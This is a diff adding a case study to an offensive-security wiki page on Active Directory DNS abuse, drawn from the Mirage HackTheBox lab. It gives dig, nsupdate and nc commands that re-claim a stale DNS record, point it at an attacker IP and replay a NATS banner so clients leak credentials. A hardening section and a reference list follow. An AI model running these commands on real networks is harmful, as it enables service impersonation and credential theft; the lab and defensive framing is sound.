@@ -72,6 +72,40 @@ bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.
 
 ---
 
+### Internal service hijacking via stale dynamic records (NATS case study)
+
+When dynamic updates stay open to all authenticated users, **a de-registered service name can be re-claimed and pointed to attacker infrastructure**. The Mirage HTB DC exposed the hostname `nats-svc.mirage.htb` after DNS scavenging, so any low-privileged user could:
+
+1. **Confirm the record is missing** and learn the SOA with `dig`:
+
+```bash
+dig @dc01.mirage.htb nats-svc.mirage.htb
+```
+
+2. **Re-create the record** toward an external/VPN interface they control:
+
+```bash
+nsupdate
+> server 10.10.11.78
+> update add nats-svc.mirage.htb 300 A 10.10.14.2
+> send
+```
+
+3. **Impersonate the plaintext service**. NATS clients expect to see one `INFO { ... }` banner before they send credentials, so copying a legitimate banner from the real broker is enough to harvest secrets:
+
+```bash
+# Capture a single INFO line from the real service and replay it to victims
+nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
+```
+
+Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or just sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.
+
+4. **Pivot with the captured creds** – in Mirage the stolen NATS account provided JetStream access, which exposed historic authentication events containing reusable AD usernames/passwords.
+
+This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.
+
+---
+
 ## Detection & hardening
 
 * Deny **Authenticated Users** the *Create all child objects* right on sensitive zones and delegate dynamic updates to a dedicated account used by DHCP.
@@ -84,6 +118,7 @@ bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.
 
 ## References
 
-* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, still the de-facto reference for wildcard/WPAD attacks)  
-* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
+- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, still the de-facto reference for wildcard/WPAD attacks)  
+- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
+- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
 {{#include ../../banners/hacktricks-training.md}}
